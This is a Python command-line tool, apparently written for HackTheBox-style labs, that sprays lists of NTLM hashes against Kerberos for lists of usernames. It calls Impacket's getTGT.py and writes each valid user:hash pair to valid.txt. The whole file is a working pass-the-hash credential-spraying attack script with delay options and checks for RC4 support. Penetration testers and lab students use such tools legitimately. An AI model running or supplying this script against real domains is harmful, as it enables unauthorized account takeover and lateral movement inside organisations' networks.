#!/usr/bin/env python3

import subprocess
import time
import argparse

parser = argparse.ArgumentParser(
    description="""
Kerberos RC4 Spray Tool

This tool tests NTLM hashes against Kerberos (TCP/88)
using Impacket getTGT.py.

Examples:

  python3 spray.py -d htb.local -u users.txt -p hashes.txt

  python3 spray.py -d htb.local -u users.txt -p hashes.txt --delay 3
""",
    usage="""
spray.py -d DOMAIN
         -u USER_FILE
         -p HASH_FILE
         [--delay SEC]
""",
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument(
    "-d",
    "--domain",
    required=True,
    metavar="DOMAIN",
    help="""
Target domain name

Example:
  htb.local
"""
)

parser.add_argument(
    "-u",
    "--users",
    required=True,
    metavar="USER_FILE",
    help="""
File containing usernames

One username per line

Example:
  users.txt
"""
)

parser.add_argument(
    "-p",
    "--hashes",
    required=True,
    metavar="HASH_FILE",
    help="""
File containing NTLM hashes

One hash per line

Example:
  hashes.txt
"""
)

parser.add_argument(
    "--delay",
    type=float,
    default=1,
    metavar="SEC",
    help="""
Delay between authentication attempts

Default:
  1 second
"""
)

args = parser.parse_args()

DOMAIN = args.domain

with open(args.users) as f:
    users = [x.strip() for x in f if x.strip()]

with open(args.hashes) as f:
    hashes = [x.strip() for x in f if x.strip()]

print("\n==============================")
print(" Kerberos RC4 Spray Tool")
print("==============================\n")

print(f"[*] Domain : {DOMAIN}")
print(f"[*] Users  : {len(users)}")
print(f"[*] Hashes : {len(hashes)}")
print(f"[*] Delay  : {args.delay}s\n")

for user in users:

    print(f"\n====== Testing user: {user} ======\n")

    for h in hashes:

        print(f"[+] {user} -> {h}")

        cmd = [
            "getTGT.py",
            f"{DOMAIN}/{user}",
            "-hashes",
            f":{h}"
        ]

        r = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        out = r.stdout + r.stderr

        if "Saving ticket in" in out:

            print("\n=================================")
            print("[!!!] VALID COMBINATION FOUND")
            print("=================================")
            print(f"USER : {user}")
            print(f"HASH : {h}")
            print("=================================\n")

            with open("valid.txt", "a") as vf:
                vf.write(f"{user}:{h}\n")

            break

        elif "KDC_ERR_PREAUTH_FAILED" in out:
            print("[-] Invalid")

        elif "KDC_ERR_ETYPE_NOTSUPP" in out:
            print("[!] RC4 disabled on domain")
            exit()

        else:
            print("[?] Unknown response")
            print(out)

        time.sleep(args.delay)

print("\n[*] Finished.\n")
